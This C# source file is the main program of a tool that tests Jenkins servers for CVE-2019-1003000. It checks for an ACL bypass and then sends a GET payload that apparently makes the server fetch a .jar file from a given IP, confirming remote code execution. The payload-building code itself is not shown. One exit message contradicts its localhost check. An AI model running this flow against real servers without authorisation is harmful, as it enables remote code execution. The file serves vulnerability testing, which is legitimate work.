using System;
using MatthiWare.CommandLine;
using jenkins_server_rce.commandlineargs;
using jenkins_server_rce.jenkinsrequests;
using System.Net.Http;
using System.Threading.Tasks;
using System.Threading;
using IronPython.Hosting;
using System.Collections.Generic;

namespace jenkins_server_rce
{
    class Program
    {
        public enum RCESuccess { Success, Failed, ErrorInRequest };

        static void Main(string[] args)
        {
            var options = new CommandLineParserOptions
            {
                AppName = "Detecting CVE-2019-1003000 RCE Bug"
            };
            var parser = new CommandLineParser<Cli_Args>(options);
            var result = parser.Parse(args);
            if (result.HasErrors)
            {
                Console.Error.WriteLine("Errors in command line arguments");
                System.Environment.Exit(1);

            }
            if (!result.Result.Url.Contains("localhost:"))
            {
                Console.WriteLine("Jenkins is configured to localhost. Please try again");
                System.Environment.Exit(2);

            }

            //Creating single instance of HttpClient in main in order to save memory 
            HttpClient client = new HttpClient();

            string targetURL = $"{result.Result.Url}/securityRealm/user/admin/";

            bool isACLBypassable = Jenkins_Requests.DetectACLBypass(client, result.Result.Url);
            if (isACLBypassable == true)
            {
                var didJarDownload = Jenkins_Requests.SendPayloadInGETRequest(targetURL, result.Result.IP, client);
                var isServerVulnerable = IsVulnerable(didJarDownload);
                Console.WriteLine($"Jenkins Server Vulnerable to CVE-2019-1003000\n*****************************g***\n{isServerVulnerable}");

            }
            else
            {
                Console.WriteLine("Pre-auth RCE is not possible. In order to test for RCE, Detectify will require " +
                    "username, password and job name from client company.");
            }

        }


        //Function Name: IsVulnerable
        //Function Parameters => Return Type : string => enums
        //Function Purpose: Will set up required arguments to pass in from terminal
        static RCESuccess IsVulnerable(string response)
        {
            if (response == "success")
            {
                Thread.Sleep(1000);
                Console.WriteLine($"[+] Response status: {response}");
                return RCESuccess.Success;
            }else if (response == RCESuccess.ErrorInRequest.ToString())
            {
                Thread.Sleep(1000);
                Console.WriteLine("Because the ACL bypass vulnerablity was present, RCE is most likely present and there is an issue in the " +
                    "GET request. Please verify all parameters are accurate and try again.");
                return RCESuccess.ErrorInRequest;
            }
            else
            {
                Thread.Sleep(1000);
                Console.WriteLine($"[+] Response: {response}\n\n\nUnable to download .jar file");
                return RCESuccess.Failed;
            }
        }


    }
    
}
